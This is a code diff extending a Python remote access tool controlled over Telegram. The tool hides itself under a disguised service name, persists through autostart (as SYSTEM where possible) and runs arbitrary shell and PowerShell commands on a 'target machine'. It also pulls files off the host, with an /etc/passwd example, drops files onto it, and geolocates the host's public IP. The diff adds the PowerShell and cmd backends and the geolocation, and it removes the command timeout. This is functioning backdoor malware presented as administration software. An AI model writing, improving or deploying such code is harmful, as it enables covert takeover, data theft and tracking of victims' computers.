@@ -4,17 +4,17 @@ Cross-platform remote administration client (Telegram-controlled).
 
 OVERVIEW
 --------
-Self-installing Telegram bot that runs silently on a target machine and
-accepts shell commands from a single authorized admin.
-
-Responsibilities:
-  1. UTF-8 bootstrap so console output never becomes mojibake.
-  2. Platform detection (Windows / macOS / Linux).
-  3. Self-install into a hidden per-OS data folder (H+S attributes on Win).
-  4. Autostart registration (elevated if possible, per-user otherwise).
-  5. Telegram polling loop with shell command execution.
-  6. Liveness reporting (/heartbeat), shutdown notifications (signals +
-     atexit), and connection loss/recovery notifications.
+Self-installing Telegram bot that:
+  * copies itself into a hidden folder under a per-OS data dir,
+  * registers itself in autostart (elevated if possible, per-user otherwise),
+  * accepts shell commands from a single admin via Telegram,
+  * supports three execution backends:
+      - plain text          -> shell (cmd.exe on Windows, sh on Unix)
+      - /cmd <text>         -> explicitly cmd.exe / sh
+      - /powershell <text>  -> PowerShell (Windows only)
+  * can send and receive files (/getfile, /putfile),
+  * reports geolocation of the public IP via multiple fallback APIs,
+  * never dies on its own (except on invalid/duplicate Telegram token).
 
 Autostart matrix:
   Windows (admin) -> schtasks ONLOGON as SYSTEM with HIGHEST privileges
@@ -25,18 +25,19 @@ Autostart matrix:
   macOS   (user)  -> ~/Library/LaunchAgents/<label>.plist
 
 Output encoding note:
-  `chcp 65001` does NOT affect cmd.exe built-in commands when their stdout
-  is a pipe. So we capture raw bytes and decode with `_dec`, which tries
-  UTF-8 first and falls back to the system OEM codepage (cp866 on Russian
-  Windows, cp437 on US, cp932 on Japanese, ...).
+  cmd.exe built-in commands ignore `chcp 65001` when their stdout is a
+  pipe. So we capture raw bytes and decode with `_dec`, trying UTF-8 first
+  and falling back to the system OEM codepage (cp866 on Russian Windows,
+  cp437 on US, cp932 on Japanese, ...).
 """
 
 # --------------------------------------------------------------------------- #
 # Standard library imports
 # --------------------------------------------------------------------------- #
-import asyncio          # async runtime
+import asyncio          # async runtime — the bot is fully async
 import atexit           # last-resort "process exiting" notification
 import getpass          # fetch current username
+import json             # parse responses from geo-IP APIs
 import logging          # silence aiogram's own loggers
 import os               # env vars, paths, chmod, low-level exit
 import platform         # OS name / release / machine
@@ -48,7 +49,7 @@ import string           # alphabet for random folder names
 import subprocess       # run shell commands
 import sys              # platform detection, stdout reconfiguration
 import time             # uptime counter
-import urllib.request   # public IP lookup
+import urllib.request   # public IP + geo-IP lookups
 import uuid             # MAC address via uuid.getnode()
 from pathlib import Path  # modern filesystem paths
 
@@ -58,7 +59,8 @@ from pathlib import Path  # modern filesystem paths
 from aiogram import Bot, Dispatcher, F
 from aiogram.exceptions import TelegramConflictError, TelegramUnauthorizedError
 from aiogram.filters import Command
-from aiogram.types import ErrorEvent, Message, FSInputFile
+from aiogram.types import ErrorEvent, FSInputFile, Message
+
 
 # =========================================================================== #
 # Platform detection
@@ -105,8 +107,8 @@ TOKEN = "__TOKEN__"          # Telegram bot token
 ADMIN_ID = __ADMIN_ID__      # integer Telegram user ID allowed to command
 CLIENT_NAME = "__NAME__"     # human-readable name shown in messages
 
-APP_NAME = "WinSvcIMTx32"    # used as file base name, registry key, task name
-APP_LABEL = f"com.{APP_NAME}"  # reverse-DNS label required by macOS launchd
+APP_NAME = "WinSvcIMTx32"    # file base name, registry key, task/service label
+APP_LABEL = f"com.{APP_NAME}"  # reverse-DNS label for macOS launchd
 
 # Telegram Bot API caps bot uploads at 50 MB. Check locally so we can
 # give a clear error instead of letting the API reject the request.
@@ -127,9 +129,8 @@ _start_ts = time.time()      # process start time, used by /heartbeat
 _offline = False             # True after a "connection lost" was reported once
 _loop = None                 # running event loop, set in main() for signals
 _shutdown_done = False       # ensures only ONE shutdown notification per process
-# Path of the directory that will receive the next document the admin
-# uploads, or None when no /putfile is pending.
-_pending_put = None
+_pending_put = None          # directory waiting to receive the next document
+
 
 # =========================================================================== #
 # Generic utilities
@@ -161,7 +162,7 @@ def _hide(p):
 
 def _write_text(p, t, mode=None):
     """
-    Write UTF-8 text to `p`, creating parent dirs and using LF newlines.
+    Write UTF-8 text to `p`, creating parent dirs, using LF newlines.
 
     `mode` optionally chmods the file (used for .sh / executables).
     """
@@ -567,6 +568,71 @@ def autostart_install():
 
 
 # =========================================================================== #
+# Geolocation via public IP (multi-API with fallbacks)
+# =========================================================================== #
+def _flag(cc):
+    """
+    Convert a 2-letter ISO country code into its flag emoji.
+
+    Uses Unicode regional indicator symbols: each letter A-Z maps to
+    U+1F1E6..U+1F1FF, and two in a row form the flag. Falls back to a
+    neutral white flag if the input is empty or malformed.
+    """
+    if not cc or len(cc) != 2:
+        return "🏳️"
+    try:
+        return "".join(chr(0x1F1E6 + ord(c.upper()) - 65) for c in cc)
+    except Exception:
+        return "🏳️"
+
+
+def get_geo_info():
+    """
+    Resolve the public IP to a country/city/coordinates via fallback APIs.
+
+    Each entry is (url, keys) where keys are the JSON field names in order:
+        (ip, country_code, country_name, city, latitude, longitude)
+    Any key may be None if the API does not provide that field. The first
+    API that returns a usable `ip` wins; the rest are skipped.
+
+    Returns a multi-line "🌍 Public IP / flag country, city (lat, lon)"
+    string, or "unknown" if every provider failed (offline, all blocked).
+    """
+    apis = [
+        ("https://ipwho.is/",                       ("ip", "country_code", "country", "city", "latitude", "longitude")),
+        ("https://ipapi.co/json/",                  ("ip", "country_code", "country_name", "city", "latitude", "longitude")),
+        ("https://freeipapi.com/api/json",          ("ipAddress", "countryCode", "countryName", "cityName", "latitude", "longitude")),
+        ("https://get.geojs.io/v1/ip/geo.json",     ("ip", "country_code", "country", "city", "latitude", "longitude")),
+        ("https://api.ip.sb/geoip",                 ("ip", "country_code", "country", "city", "latitude", "longitude")),
+        ("http://ipwhois.app/json/",                ("ip", "country_code", "country", "city", "latitude", "longitude")),
+        ("http://ip-api.com/json/",                 ("query", "countryCode", "country", "city", "lat", "lon")),
+        ("https://ipinfo.io/json",                  ("ip", "country", "country", "city", None, None)),
+        ("https://api.myip.com",                    ("ip", "cc", "country", None, None, None)),
+    ]
+    for url, keys in apis:
+        try:
+            with urllib.request.urlopen(url, timeout=6) as r:
+                d = json.loads(r.read().decode("utf-8", errors="replace"))
+            ip = d.get(keys[0])
+            if not ip:
+                continue
+            cc = d.get(keys[1]) or ""
+            country = d.get(keys[2]) or "?"
+            city = d.get(keys[3]) or "?"
+            lat = d.get(keys[4]) if keys[4] else None
+            lon = d.get(keys[5]) if keys[5] else None
+            coords = (
+                f" ({lat}, {lon})"
+                if lat is not None and lon is not None
+                else ""
+            )
+            return f"🌍 Public IP: {ip}\n{_flag(cc)} {country}, {city}{coords}"
+        except Exception:
+            pass
+    return "🌍 Public IP: unknown"
+
+
+# =========================================================================== #
 # System information gathering
 # =========================================================================== #
 def get_public_ip():
@@ -605,29 +671,32 @@ def get_mac():
 
 
 def get_device_info():
-    """Human-readable snapshot of the current host."""
+    """
+    Human-readable snapshot of the current host.
+
+    Includes hostname, user, OS, arch, LAN IP, geolocated public IP,
+    MAC, CWD, install path, admin flag, and platform tag.
+    """
     try:
         u = getpass.getuser()
     except Exception:
         u = "unknown"
     try:
-        return "\n".join(
-            [
-                f"🖥 Host: {platform.node()}",
-                f"👤 User: {u}",
-                f"💻 OS: {platform.system()} {platform.release()} "
-                f"({platform.version()})",
-                f"🏗 Architecture: {platform.machine()}",
-                f"🌐 Local IP: {get_local_ip()}",
-                f"🌍 Public IP: {get_public_ip()}",
-                f"🔗 MAC: {get_mac()}",
-                f"📁 CWD: {os.getcwd()}",
-                f"📂 Installed: {_read_install_path() or '❌'}",
-                f"🛡 Admin: {is_admin()}",
-                f"🐧 Platform: "
-                f"{'win' if IS_WIN else 'mac' if IS_MAC else 'linux'}",
-            ]
-        )
+        return "\n".join([
+            f"🖥 Host: {platform.node()}",
+            f"👤 User: {u}",
+            f"💻 OS: {platform.system()} {platform.release()} ({platform.version()})",
+            f"🏗 Architecture: {platform.machine()}",
+            f"🌐 Local IP: {get_local_ip()}",
+            get_geo_info(),
+            f"🔗 MAC: {get_mac()}",
+            f"📁 CWD: {os.getcwd()}",
+            f"📂 Installed: {_read_install_path() or '❌'}",
+            f"🛡 Admin: {is_admin()}",
+            f"🐧 Platform: {'win' if IS_WIN else 'mac' if IS_MAC else 'linux'}",
+            f"\n",
+            f"Type /help to see command list.",
+        ])
     except Exception as e:
         return f"[device info error: {e}]"
 
@@ -649,19 +718,57 @@ async def build_online_message():
 # =========================================================================== #
 def run_cmd(c):
     """
-    Execute a shell command with a 60-second timeout.
+    Default shell execution — used for plain text messages.
 
-    Output decoding: capture raw bytes and decode via `_dec`
-    (UTF-8 first, OEM codepage fallback). This is the fix for cmd.exe
-    built-in commands like `dir` producing mojibake when `chcp 65001`
-    was used but stdout is a pipe.
+    Windows: `shell=True` uses cmd.exe. Unix: uses /bin/sh.
+    No timeout — long-running commands are allowed to complete. This is
+    a deliberate trade-off: `tail -f` or `ping -t` won't be killed, but
+    they'll block a worker thread until done.
     """
     try:
-        r = subprocess.run(c, shell=True, capture_output=True, timeout=60)
+        r = subprocess.run(c, shell=True, capture_output=True)
         o = _dec((r.stdout or b"") + (r.stderr or b"")).strip()
         return o or f"[empty, rc={r.returncode}]"
-    except subprocess.TimeoutExpired:
-        return "[timeout > 60s]"
+    except Exception as e:
+        return f"[error: {e}]"
+
+
+def run_cmd_cmdline(c):
+    """
+    Explicit cmd.exe / sh execution — used by /cmd.
+
+    Windows: invokes cmd.exe /c so built-ins like `dir`, `set`, `copy`
+    behave identically to running them from a console.
+    Unix:    falls back to shell=True (same as run_cmd).
+    """
+    try:
+        if IS_WIN:
+            r = subprocess.run(["cmd.exe", "/c", c], capture_output=True)
+        else:
+            r = subprocess.run(c, shell=True, capture_output=True)
+        o = _dec((r.stdout or b"") + (r.stderr or b"")).strip()
+        return o or f"[empty, rc={r.returncode}]"
+    except Exception as e:
+        return f"[error: {e}]"
+
+
+def run_cmd_ps(c):
+    """
+    PowerShell execution — used by /powershell.
+
+    Windows-only. Runs PowerShell with -NoProfile (ignore user profile)
+    and -NonInteractive (no prompts, no reading from console) so that
+    scripts that expect a human do not hang the worker thread.
+    """
+    if not IS_WIN:
+        return "[powershell] only supported on Windows"
+    try:
+        r = subprocess.run(
+            ["powershell", "-NoProfile", "-NonInteractive", "-Command", c],
+            capture_output=True,
+        )
+        o = _dec((r.stdout or b"") + (r.stderr or b"")).strip()
+        return o or f"[empty, rc={r.returncode}]"
     except Exception as e:
         return f"[error: {e}]"
 
@@ -700,11 +807,11 @@ async def _send_and_exit(t):
 
 def _on_signal(signum, frame):
     """
-    Sync handler invoked on SIGINT / SIGTERM / SIGBREAK.
+    Sync handler for SIGINT / SIGTERM / SIGBREAK.
 
     Schedules an async shutdown on the running event loop via
-    `run_coroutine_threadsafe`. If the loop isn't available, falls back
-    to a hard exit.
+    `run_coroutine_threadsafe`. Falls back to hard exit if the loop is
+    unavailable (e.g. during early startup).
     """
     global _shutdown_done
     if _shutdown_done:
@@ -761,7 +868,7 @@ async def _on_error(e):
 
 @dp.message(Command("start"))
 async def cmd_start(m):
-    """/start — send host info to the admin."""
+    """/start — send host info + geolocation to the admin."""
     try:
         if not is_adm(m):
             return await m.answer("⛔ Access denied")
@@ -775,30 +882,31 @@ async def cmd_help(m):
     """
     /help — print the list of available commands.
 
-    Always sent in plain text (no Markdown) so that stray backticks
-    in paths or command examples cannot break the parser.
+    Sent as plain text (no Markdown) so paths with backticks or
+    parentheses in examples cannot break the parser.
     """
     try:
         if not is_adm(m):
             return await m.answer("⛔ Access denied")
         await m.answer(
             f"📖 [{CLIENT_NAME}] commands\n\n"
-            f"/start — host info (host, user, OS, IPs, MAC, admin status)\n"
+            f"/start — host info + geo\n"
             f"/heartbeat — liveness probe (uptime, PID, offline flag)\n"
             f"/help — this message\n"
             f"/getfile <path> — download a file from the target\n"
             f"    example: /getfile C:\\Users\\Public\\log.txt\n"
-            f"    example: /getfile /etc/passwd\n"
             f"/putfile <dir> — upload a file from Telegram into <dir>\n"
             f"    example: /putfile C:\\Users\\Public\n"
-            f"    example: /putfile /tmp\n"
-            f"    (bot will then ask you to send the file)\n\n"
-            f"anything else — treated as a shell command and executed\n"
+            f"    (bot will then ask you to send the file)\n"
+            f"/cmd <command> — run via cmd.exe (Windows) / sh (Unix)\n"
+            f"    example: /cmd dir\n"
+            f"/powershell <command> — run via PowerShell (Windows only)\n"
+            f"    example: /powershell Get-Process | Select -First 5\n\n"
+            f"anything else — shell command (no timeout)\n"
             f"    example: dir\n"
             f"    example: ps aux | head\n\n"
             f"limits:\n"
-            f"  • max upload: {MAX_UPLOAD // (1024 * 1024)} MB per file\n"
-            f"  • command timeout: 60s"
+            f"  • max upload: {MAX_UPLOAD // (1024 * 1024)} MB per file"
         )
     except Exception:
         pass
@@ -809,59 +917,43 @@ async def cmd_getfile(m):
     """
     /getfile <path> — send a file from the target to the admin.
 
-    Behaviour:
-      * Path is taken as-is from the message; no shell expansion, so
-        spaces and special characters must be part of the argument.
-      * Existence and size are checked locally before uploading so that
-        the admin gets a clear error instead of a Telegram API failure.
-      * The file is streamed from disk via FSInputFile; aiogram performs
-        the actual upload in a worker thread, keeping the loop free.
-      * Files above MAX_UPLOAD are rejected — Telegram caps bot uploads
-        at 50 MB.
+    Validates the path locally (exists, not a directory, not empty,
+    not above the 50 MB Telegram limit) before hitting the API.
     """
     try:
         if not is_adm(m):
             return await m.answer("⛔ Access denied")
 
-        # Everything after "/getfile " is treated as the path.
-        raw = (m.text or "").strip()
-        parts = raw.split(maxsplit=1)
-        if len(parts) < 2 or not parts[1].strip():
+        r = (m.text or "").strip()
+        p_ = r.split(maxsplit=1)
+        if len(p_) < 2 or not p_[1].strip():
             return await m.answer(
                 "usage: /getfile <path>\n"
                 "example: /getfile C:\\Users\\Public\\log.txt\n"
                 "example: /getfile /etc/passwd"
             )
 
-        # Strip surrounding quotes so paths with spaces can be quoted.
-        path = parts[1].strip().strip('"').strip("'")
-        p = Path(path)
-
-        # Local sanity checks before hitting the API.
+        p = Path(p_[1].strip().strip('"').strip("'"))
         if not p.exists():
             return await m.answer(f"❌ not found: {p}")
         if p.is_dir():
             return await m.answer(f"❌ is a directory, not a file: {p}")
-
         try:
-            size = p.stat().st_size
+            s = p.stat().st_size
         except Exception as e:
             return await m.answer(f"❌ cannot stat: {e}")
-
-        if size == 0:
+        if s == 0:
             return await m.answer(f"❌ empty file: {p}")
-        if size > MAX_UPLOAD:
+        if s > MAX_UPLOAD:
             return await m.answer(
-                f"❌ file too large: {size / 1024 / 1024:.1f} MB "
+                f"❌ file too large: {s/1024/1024:.1f} MB "
                 f"(limit {MAX_UPLOAD // (1024 * 1024)} MB)"
             )
 
-        # Stream from disk; aiogram uploads in a thread under the hood.
         try:
-            doc = FSInputFile(str(p), filename=p.name)
-            await m.answer_document(doc, caption=f"[{CLIENT_NAME}] {p}")
+            d = FSInputFile(str(p), filename=p.name)
+            await m.answer_document(d, caption=f"[{CLIENT_NAME}] {p}")
         except Exception as e:
-            # Fallback: report the error as plain text.
             try:
                 await m.answer(f"❌ upload failed: {e}")
             except Exception:
@@ -873,32 +965,26 @@ async def cmd_getfile(m):
 @dp.message(Command("putfile"))
 async def cmd_putfile(m):
     """
-    /putfile <target_directory> — ask the admin to upload a file, then
-    save it into <target_directory> under its original name.
+    /putfile <dir> — arm a one-shot receive mode.
 
-    Flow:
-      1. Validate the directory (must exist and be a directory).
-      2. Remember it in `_pending_put`.
-      3. Reply telling the admin to send the file as a document.
-      4. The next document from the admin is saved there and the pending
-         state is cleared.
+    The next document the admin sends will be saved into <dir> under its
+    original filename, then the pending state is cleared.
     """
     global _pending_put
     try:
         if not is_adm(m):
             return await m.answer("⛔ Access denied")
 
-        raw = (m.text or "").strip()
-        parts = raw.split(maxsplit=1)
-        if len(parts) < 2 or not parts[1].strip():
+        r = (m.text or "").strip()
+        p_ = r.split(maxsplit=1)
+        if len(p_) < 2 or not p_[1].strip():
             return await m.answer(
                 "usage: /putfile <target_directory>\n"
                 "example: /putfile C:\\Users\\Public\n"
                 "example: /putfile /tmp"
             )
 
-        d = Path(parts[1].strip().strip('"').strip("'"))
-
+        d = Path(p_[1].strip().strip('"').strip("'"))
         if not d.exists():
             return await m.answer(f"❌ directory not found: {d}")
         if not d.is_dir():
@@ -916,27 +1002,23 @@ async def cmd_putfile(m):
 @dp.message(F.document)
 async def cmd_putrecv(m):
     """
-    Receive a document from the admin while /putfile is pending.
+    Receive a document while /putfile is pending.
 
-    The original filename is preserved (path separators stripped to
-    prevent directory traversal). The file is streamed to disk via
-    `bot.download`, which does the HTTP work in a worker thread.
+    Filename is sanitized: backslashes normalized to forward slashes,
+    then `basename` applied, so `../../etc/passwd` becomes `passwd`.
     """
     global _pending_put
     try:
         if not is_adm(m):
             return
-        # No /putfile pending -> ignore documents entirely.
         if not _pending_put:
             return
 
         d = Path(_pending_put)
         _pending_put = None  # consume, one-shot
 
-        # Preserve the original name but strip any directory components.
         fn = (m.document.file_name or "").replace("\\", "/")
         fn = os.path.basename(fn) or f"upload_{_rand(8)}"
-
         dst = d / fn
 
         try:
@@ -945,18 +1027,17 @@ async def cmd_putrecv(m):
             return await m.answer(f"❌ download failed: {e}")
 
         try:
-            sz = dst.stat().st_size
+            s = dst.stat().st_size
         except Exception:
-            sz = 0
-
-        await m.answer(f"✅ saved: {dst}\n📦 {sz} bytes")
+            s = 0
+        await m.answer(f"✅ saved: {dst}\n📦 {s} bytes")
     except Exception as e:
         try:
             await m.answer(f"❌ putfile err: {e}")
         except Exception:
             pass
 
-            
+
 @dp.message(Command("heartbeat"))
 async def cmd_heartbeat(m):
     """Liveness probe: uptime, PID, offline flag, admin status, platform."""
@@ -978,14 +1059,72 @@ async def cmd_heartbeat(m):
         pass
 
 
+@dp.message(Command("cmd"))
+async def cmd_cmd(m):
+    """
+    /cmd <command> — run explicitly through cmd.exe (Windows) / sh (Unix).
+
+    Registered before F.text so the /cmd prefix isn't captured by the
+    catch-all text handler.
+    """
+    try:
+        if not is_adm(m):
+            return await m.answer("⛔ Access denied")
+        parts = (m.text or "").strip().split(maxsplit=1)
+        if len(parts) < 2 or not parts[1].strip():
+            return await m.answer("usage: /cmd <command>\nexample: /cmd dir")
+        o = await asyncio.to_thread(run_cmd_cmdline, parts[1].strip())
+        for ch in split_msg(o):
+            try:
+                await m.answer(f"[{CLIENT_NAME}]\n```\n{ch}\n```", parse_mode="Markdown")
+            except Exception:
+                try:
+                    await m.answer(f"[{CLIENT_NAME}] {ch}")
+                except Exception:
+                    pass
+    except Exception:
+        pass
+
+
+@dp.message(Command("powershell"))
+async def cmd_ps(m):
+    """
+    /powershell <command> — run through PowerShell (Windows only).
+
+    Uses -NoProfile -NonInteractive so scripts that prompt for input
+    do not hang the worker thread.
+    """
+    try:
+        if not is_adm(m):
+            return await m.answer("⛔ Access denied")
+        parts = (m.text or "").strip().split(maxsplit=1)
+        if len(parts) < 2 or not parts[1].strip():
+            return await m.answer(
+                "usage: /powershell <command>\n"
+                "example: /powershell Get-Process | Select -First 5"
+            )
+        o = await asyncio.to_thread(run_cmd_ps, parts[1].strip())
+        for ch in split_msg(o):
+            try:
+                await m.answer(f"[{CLIENT_NAME}]\n```\n{ch}\n```", parse_mode="Markdown")
+            except Exception:
+                try:
+                    await m.answer(f"[{CLIENT_NAME}] {ch}")
+                except Exception:
+                    pass
+    except Exception:
+        pass
+
+
 @dp.message(F.text)
 async def cmd_exec(m):
     """
-    Any plain text from the admin is treated as a shell command.
+    Catch-all text handler — anything not matched above is a shell command.
 
-    Executed in a worker thread so the event loop stays responsive.
-    Output is chunked and sent as Markdown code fences, with a plain-text
-    fallback if Markdown parsing fails.
+    Executed in a worker thread (asyncio.to_thread) so the event loop
+    stays responsive even when the command runs for a long time.
+    Output is chunked and sent as Markdown code fences, with a
+    plain-text fallback if Markdown parsing fails.
     """
     try:
         if not is_adm(m):
@@ -996,9 +1135,7 @@ async def cmd_exec(m):
         o = await asyncio.to_thread(run_cmd, c)
         for ch in split_msg(o):
             try:
-                await m.answer(
-                    f"[{CLIENT_NAME}]\n```\n{ch}\n```", parse_mode="Markdown"
-                )
+                await m.answer(f"[{CLIENT_NAME}]\n```\n{ch}\n```", parse_mode="Markdown")
             except Exception:
                 try:
                     await m.answer(f"[{CLIENT_NAME}] {ch}")
@@ -1055,11 +1192,15 @@ async def polling_loop():
     """
     global _offline
     pt = asyncio.create_task(dp.start_polling(bot, handle_signals=False))
+
+    # If we were offline, wait 3 seconds. If the task is still pending,
+    # the connection was successfully re-established.
     if _offline:
         _, p = await asyncio.wait([pt], timeout=3.0)
         if pt in p:
             _offline = False
             asyncio.create_task(_notify_back_online())
+
     try:
         await pt
         return False
